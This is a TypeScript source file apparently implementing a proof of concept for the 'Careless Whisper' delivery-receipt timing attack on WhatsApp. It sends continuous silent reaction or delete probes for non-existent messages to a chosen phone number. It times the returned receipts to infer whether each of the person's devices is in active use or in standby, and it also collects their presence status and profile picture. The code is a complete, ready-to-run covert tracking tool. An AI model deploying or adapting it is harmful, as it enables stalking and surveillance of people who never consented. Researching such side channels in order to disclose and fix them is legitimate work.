import '@whiskeysockets/baileys';
import { WASocket, proto, jidNormalizedUser, generateMessageIDV2 } from '@whiskeysockets/baileys';
import { pino } from 'pino';

// Suppress Baileys debug output (Closing session spam)
const logger = pino({
    level: process.argv.includes('--debug') ? 'debug' : 'silent'
});

/**
 * Probe method types
 * - 'delete': Delete probe (may trigger a notification)
 * - 'reaction': Reaction probe (sends reaction to non-existent message) - DEFAULT
 */
export type ProbeMethod = 'delete' | 'reaction';

/**
 * Logger utility for debug and normal mode
 */
class TrackerLogger {
    private isDebugMode: boolean;

    constructor(debugMode: boolean = false) {
        this.isDebugMode = debugMode;
    }

    setDebugMode(enabled: boolean) {
        this.isDebugMode = enabled;
    }

    debug(...args: any[]) {
        if (this.isDebugMode) {
            console.log(...args);
        }
    }

    info(...args: any[]) {
        console.log(...args);
    }

    formatDeviceState(jid: string, rtt: number, avgRtt: number, median: number, threshold: number, state: string) {
        const stateColor = state === 'Online' ? '🟢' : state === 'Standby' ? '🟡' : '⚪';
        const timestamp = new Date().toLocaleTimeString('de-DE');

        // Box width is 64 characters, inner content is 62 characters (excluding ║ on both sides)
        const boxWidth = 62;

        const header = `${stateColor} Device Status Update - ${timestamp}`;
        const jidLine = `JID:        ${jid}`;
        const statusLine = `Status:     ${state}`;
        const rttLine = `RTT:        ${rtt}ms`;
        const avgLine = `Avg (3):    ${avgRtt.toFixed(0)}ms`;
        const medianLine = `Median:     ${median.toFixed(0)}ms`;
        const thresholdLine = `Threshold:  ${threshold.toFixed(0)}ms`;

        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
        console.log(`║ ${header.padEnd(boxWidth)} ║`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ ${jidLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${statusLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${rttLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${avgLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${medianLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${thresholdLine.padEnd(boxWidth)} ║`);
        console.log(`╚════════════════════════════════════════════════════════════════╝\n`);
    }
}

const trackerLogger = new TrackerLogger();

/**
 * Metrics tracked per device for activity monitoring
 */
interface DeviceMetrics {
    rttHistory: number[];      // Historical RTT measurements (up to 2000)
    recentRtts: number[];      // Recent RTTs for moving average (last 3)
    state: string;             // RTT estimate (Online/Standby/Calibrating/No ACK)
    lastRtt: number;           // Most recent RTT measurement
    lastUpdate: number;        // Timestamp of last update
}

/**
 * WhatsAppTracker - Monitors messaging app user activity using RTT-based analysis
 *
 * This class implements a privacy research proof-of-concept that demonstrates
 * how messaging apps can leak user activity information through network timing.
 *
 * The tracker sends probe messages and measures Round-Trip Time (RTT) to detect
 * when a user's device is actively in use vs. in standby mode.
 *
 * Works with WhatsApp, Signal, and similar messaging platforms.
 *
 * Based on research: "Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users"
 * by Gegenhuber et al., University of Vienna & SBA Research
 */
export class WhatsAppTracker {
    private sock: WASocket;
    private targetJid: string;
    private trackedJids: Set<string> = new Set(); // Multi-device support
    private isTracking: boolean = false;
    private deviceMetrics: Map<string, DeviceMetrics> = new Map();
    private globalRttHistory: number[] = []; // For threshold calculation
    private probeStartTimes: Map<string, number> = new Map();
    private probeTimeouts: Map<string, NodeJS.Timeout> = new Map();
    private lastPresence: string | null = null;
    private probeMethod: ProbeMethod = 'reaction';
    public onUpdate?: (data: any) => void;
    private readonly onMessageUpdate = (updates: any[]) => {
        for (const update of updates) {
            if (update.key?.id && this.probeStartTimes.has(update.key.id)) {
                this.analyzeUpdate(update);
            }
        }
    };
    private readonly onRawReceipt = (node: any) => this.handleRawReceipt(node);
    private readonly onPresenceUpdate = (update: any) => {
        if (!update.presences) return;
        const targetNumber = this.targetJid.split('@')[0].split(':')[0];
        for (const [jid, presenceData] of Object.entries(update.presences) as [string, any][]) {
            const number = jid.split('@')[0].split(':')[0];
            if (number !== targetNumber || !presenceData?.lastKnownPresence) continue;
            this.trackedJids.add(jid);
            this.lastPresence = presenceData.lastKnownPresence;
            break;
        }
    };

    constructor(sock: WASocket, targetJid: string, debugMode: boolean = false) {
        this.sock = sock;
        this.targetJid = targetJid;
        this.trackedJids.add(targetJid);
        trackerLogger.setDebugMode(debugMode);
    }

    public setProbeMethod(method: ProbeMethod) {
        this.probeMethod = method;
        trackerLogger.info(`\n🔄 Probe method changed to: ${method === 'delete' ? 'Delete' : 'Reaction'}\n`);
    }

    public getProbeMethod(): ProbeMethod {
        return this.probeMethod;
    }

    /**
     * Start tracking the target user's activity
     * Sets up event listeners for message receipts and presence updates
     */
    public async startTracking() {
        if (this.isTracking) return;
        this.isTracking = true;
        trackerLogger.info(`\n✅ Tracking started for ${this.targetJid}`);
        trackerLogger.info(`Probe method: ${this.probeMethod === 'delete' ? 'Delete' : 'Reaction'} (may trigger notifications)\n`);

        // Listen for message updates (receipts)
        this.sock.ev.on('messages.update', this.onMessageUpdate);

        // Listen for raw receipts to catch 'inactive' type which are ignored by Baileys
        this.sock.ws.on('CB:receipt', this.onRawReceipt);

        // Listen for presence updates
        this.sock.ev.on('presence.update', this.onPresenceUpdate);

        // Subscribe to presence updates
        try {
            await this.sock.presenceSubscribe(this.targetJid);
            trackerLogger.debug(`[PRESENCE] Successfully subscribed to presence for ${this.targetJid}`);
            trackerLogger.debug(`[MULTI-DEVICE] Currently tracking JIDs: ${Array.from(this.trackedJids).join(', ')}`);
        } catch (err) {
            trackerLogger.debug('[PRESENCE] Error subscribing to presence:', err);
        }

        // Send initial state update
        if (this.onUpdate) {
            this.onUpdate({
                devices: [],
                deviceCount: this.trackedJids.size,
                presence: this.lastPresence,
                median: 0,
                threshold: 0
            });
        }

        // Start the probe loop
        this.probeLoop();
    }

    private async probeLoop() {
        while (this.isTracking) {
            try {
                await this.sendProbe();
            } catch (err) {
                logger.error(err, 'Error sending probe');
            }
            const delay = Math.floor(Math.random() * 100) + 2000;
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    private async sendProbe() {
        if (this.probeMethod === 'delete') {
            await this.sendDeleteProbe();
        } else {
            await this.sendReactionProbe();
        }
    }

    private scheduleProbeTimeout(messageId: string, startTime: number, jid: string) {
        // An ACK can arrive before sendMessage resolves; processAck then removes the ID.
        if (!this.probeStartTimes.has(messageId)) return;
        const timeoutId = setTimeout(() => {
            if (!this.probeStartTimes.has(messageId)) return;
            const elapsedTime = Date.now() - startTime;
            this.probeStartTimes.delete(messageId);
            this.probeTimeouts.delete(messageId);
            this.markProbeUnconfirmed(jid, elapsedTime);
        }, 10000);
        this.probeTimeouts.set(messageId, timeoutId);
    }

    /**
     * Send a delete probe. The recipient may receive a notification even when no
     * message appears in the conversation.
     * Sends a "delete" command for a non-existent message
     */
    private async sendDeleteProbe() {
        const probeId = generateMessageIDV2(this.sock.user?.id);
        const startTime = Date.now();
        this.probeStartTimes.set(probeId, startTime);
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;
            
            const randomDeleteMessage = {
                delete:{
                    remoteJid: this.targetJid,
                    fromMe: true,
                    id: randomMsgId,
                }
            };

            trackerLogger.debug(
                `[PROBE-DELETE] Sending delete probe for fake message ${randomMsgId}`
            );
            const result = await this.sock.sendMessage(this.targetJid, randomDeleteMessage, { messageId: probeId });

            if (result?.key?.id === probeId) {
                trackerLogger.debug(`[PROBE-DELETE] Delete probe sent successfully, message ID: ${probeId}`);
                this.scheduleProbeTimeout(probeId, startTime, result.key.remoteJid || this.targetJid);
            } else {
                this.probeStartTimes.delete(probeId);
                trackerLogger.debug('[PROBE-DELETE ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            this.probeStartTimes.delete(probeId);
            logger.error(err, '[PROBE-DELETE ERROR] Failed to send delete probe message');
        }
    }

    /**
     * Send a reaction probe - original method
     * Uses a reaction to a non-existent message to minimize user disruption
     */
    private async sendReactionProbe() {
        const probeId = generateMessageIDV2(this.sock.user?.id);
        const startTime = Date.now();
        this.probeStartTimes.set(probeId, startTime);
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            // Randomize reaction emoji
            const reactions = ['👍', '❤️', '😂', '😮', '😢', '🙏', '👻', '🔥', '✨', ''];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];

            const reactionMessage = {
                react: {
                    text: randomReaction,
                    key: {
                        remoteJid: this.targetJid,
                        fromMe: true,
                        id: randomMsgId
                    }
                }
            };

            trackerLogger.debug(`[PROBE-REACTION] Sending probe with reaction "${randomReaction}" to non-existent message ${randomMsgId}`);
            const result = await this.sock.sendMessage(this.targetJid, reactionMessage, { messageId: probeId });

            if (result?.key?.id === probeId) {
                trackerLogger.debug(`[PROBE-REACTION] Probe sent successfully, message ID: ${probeId}`);
                this.scheduleProbeTimeout(probeId, startTime, result.key.remoteJid || this.targetJid);
            } else {
                this.probeStartTimes.delete(probeId);
                trackerLogger.debug('[PROBE-REACTION ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            this.probeStartTimes.delete(probeId);
            logger.error(err, '[PROBE-REACTION ERROR] Failed to send probe message');
        }
    }

    /**
     * Handle raw receipt nodes directly from the websocket
     * This is necessary because Baileys ignores receipts with type="inactive"
     */
    private handleRawReceipt(node: any) {
        try {
            const { attrs } = node;
            // We only care about 'inactive' receipts here
            if (attrs.type === 'inactive') {
                trackerLogger.debug(`[RAW RECEIPT] Received inactive receipt: ${JSON.stringify(attrs)}`);

                const msgId = attrs.id;
                if (typeof msgId === 'string' && this.probeStartTimes.has(msgId)) {
                    this.processAck(msgId, attrs.from || this.targetJid, 'inactive');
                }
            }
        } catch (err) {
            trackerLogger.debug(`[RAW RECEIPT] Error handling receipt: ${err}`);
        }
    }

    /**
     * Process an ACK (receipt) from a device
     */
    private processAck(msgId: string, fromJid: string, type: string) {
        trackerLogger.debug(`[ACK PROCESS] ID: ${msgId}, JID: ${fromJid}, Type: ${type}`);

        if (!msgId || !fromJid) return;

        // Check if this is one of our probes
        const startTime = this.probeStartTimes.get(msgId);

        if (startTime) {
            const rtt = Math.max(1, Date.now() - startTime);
            trackerLogger.debug(`[TRACKING] ✅ ${type.toUpperCase()} received for ${msgId} from ${fromJid}, RTT: ${rtt}ms`);

            // Clear timeout
            const timeoutId = this.probeTimeouts.get(msgId);
            if (timeoutId) {
                clearTimeout(timeoutId);
                this.probeTimeouts.delete(msgId);
            }

            this.probeStartTimes.delete(msgId);
            this.addMeasurementForDevice(fromJid, rtt);
        }
    }

    /**
     * Analyze message update and calculate RTT
     * @param update Message update from WhatsApp
     */
    private analyzeUpdate(update: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }) {
        const status = update.update.status;
        const msgId = update.key.id;
        const fromJid = update.key.remoteJid || this.targetJid;

        if (!msgId) return;

        trackerLogger.debug(`[TRACKING] Message Update - ID: ${msgId}, JID: ${fromJid}, Status: ${status} (${this.getStatusName(status)})`);

        // Only CLIENT ACK (3) means device is online and received the message
        // SERVER ACK (2) only means server received it, not the device
        if (status === 3) { // CLIENT ACK
            this.processAck(msgId, fromJid, 'client_ack');
        }
    }

    private getStatusName(status: number | null | undefined): string {
        switch (status) {
            case 0: return 'ERROR';
            case 1: return 'PENDING';
            case 2: return 'SERVER_ACK';
            case 3: return 'DELIVERY_ACK';
            case 4: return 'READ';
            case 5: return 'PLAYED';
            default: return 'UNKNOWN';
        }
    }

    /**
     * Mark a probe unconfirmed when no CLIENT ACK is received.
     * This alone does not establish that the recipient device is offline.
     * @param jid Device JID
     * @param timeout Time elapsed before timeout
     */
    private markProbeUnconfirmed(jid: string, timeout: number) {
        if (this.deviceMetrics.size === 0) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: 'No ACK',
                lastRtt: 0,
                lastUpdate: Date.now()
            });
        } else {
            // A timeout has no device identifier. Keep the existing device list
            // instead of adding a second entry for a phone-number alias.
            for (const metrics of this.deviceMetrics.values()) {
                metrics.state = 'No ACK';
                metrics.lastRtt = 0;
                metrics.lastUpdate = Date.now();
            }
        }

        trackerLogger.info(`\n⚪ No ACK for ${jid} after ${timeout}ms; device state is unconfirmed\n`);
        this.sendUpdate('no-ack', jid);
    }

    /**
     * Add RTT measurement for a specific device and update its state
     * @param jid Device JID
     * @param rtt Round-trip time in milliseconds
     */
    private addMeasurementForDevice(jid: string, rtt: number) {
        const placeholder = this.deviceMetrics.get(this.targetJid);
        if (jid !== this.targetJid && placeholder?.state === 'No ACK' && placeholder.rttHistory.length === 0) {
            this.deviceMetrics.delete(this.targetJid);
        }
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: 'Calibrating...',
                lastRtt: rtt,
                lastUpdate: Date.now()
            });
        }

        const metrics = this.deviceMetrics.get(jid)!;

        // Only add measurements if we actually received a CLIENT ACK (rtt <= 5000ms)
        if (rtt <= 5000) {
            // 1. Add to device's recent RTTs for moving average (last 3)
            metrics.recentRtts.push(rtt);
            if (metrics.recentRtts.length > 3) {
                metrics.recentRtts.shift();
            }

            // 2. Add to device's history for calibration (last 2000), filtering outliers > 5000ms
            metrics.rttHistory.push(rtt);
            if (metrics.rttHistory.length > 2000) {
                metrics.rttHistory.shift();
            }

            // 3. Add to global history for global threshold calculation
            this.globalRttHistory.push(rtt);
            if (this.globalRttHistory.length > 2000) {
                this.globalRttHistory.shift();
            }

            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();

            // Categorize RTT against the recent baseline; this is not a screen-state measurement.
            this.categorizeRtt(jid);
        }
        else {
            metrics.state = 'Delayed ACK';
            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();
        }

        this.sendUpdate('measurement', jid);
    }

    /**
     * Categorize confirmed RTT against the running baseline.
     * @param jid Device JID
     */
    private categorizeRtt(jid: string) {
        const metrics = this.deviceMetrics.get(jid);
        if (!metrics) return;

        // Calculate device's moving average
        const movingAvg = metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length;

        // Calculate global median and threshold
        let median = 0;
        let threshold = 0;

        if (this.globalRttHistory.length >= 3) {
            const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
            const mid = Math.floor(sorted.length / 2);
            median = sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;


            threshold = median * 0.9;

            if (movingAvg < threshold) {
                metrics.state = 'Online';
            } else {
                metrics.state = 'Standby';
            }
        } else {
            metrics.state = 'Calibrating...';
        }

        // Normal mode: Formatted output
        trackerLogger.formatDeviceState(jid, metrics.lastRtt, movingAvg, median, threshold, metrics.state);

        // Debug mode: Additional debug information
        trackerLogger.debug(`[DEBUG] RTT History length: ${metrics.rttHistory.length}, Global History: ${this.globalRttHistory.length}`);
    }

    /**
     * Send update to client with current tracking data
     */
    private sendUpdate(eventKind: 'measurement' | 'no-ack', measuredJid: string) {
        // Build devices array
        const devices = Array.from(this.deviceMetrics.entries()).map(([jid, metrics]) => ({
            jid,
            state: metrics.state,
            rtt: metrics.lastRtt,
            avg: metrics.recentRtts.length > 0
                ? metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length
                : 0
        }));

        // Calculate global stats for backward compatibility
        const globalMedian = this.calculateGlobalMedian();
        const globalThreshold = globalMedian * 0.9;

        const data = {
            eventKind,
            measuredJid,
            devices,
            deviceCount: devices.length,
            presence: this.lastPresence,
            // Global stats for charts
            median: globalMedian,
            threshold: globalThreshold
        };

        if (this.onUpdate) {
            this.onUpdate(data);
        }
    }

    /**
     * Calculate global median RTT across all measurements
     * @returns Median RTT value
     */
    private calculateGlobalMedian(): number {
        if (this.globalRttHistory.length < 3) return 0;

        const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        return sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
    }

    /**
     * Get profile picture URL for the target user
     * @returns Profile picture URL or null if not available
     */
    public async getProfilePicture() {
        try {
            return await this.sock.profilePictureUrl(this.targetJid, 'image');
        } catch (err) {
            return null;
        }
    }

    /**
     * Stop tracking and clean up resources
     */
    public stopTracking() {
        this.isTracking = false;
        this.sock.ev.off('messages.update', this.onMessageUpdate);
        this.sock.ev.off('presence.update', this.onPresenceUpdate);
        this.sock.ws.off('CB:receipt', this.onRawReceipt);

        // Clear all pending timeouts
        for (const timeoutId of this.probeTimeouts.values()) {
            clearTimeout(timeoutId);
        }
        this.probeTimeouts.clear();
        this.probeStartTimes.clear();

        logger.info('Stopping tracking');
    }
}
